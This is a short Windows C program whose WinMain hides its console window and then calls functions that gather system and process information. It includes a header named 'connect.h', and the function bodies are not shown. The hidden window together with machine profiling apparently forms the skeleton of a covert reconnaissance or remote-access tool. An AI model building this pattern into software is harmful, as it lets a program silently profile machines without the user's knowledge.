#include <stdio.h>
#include <Windows.h>
#include "connect.h"
#include <TlHelp32.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    GetThatSystemInfo();
    GetProcessInfo();


    return 0;
}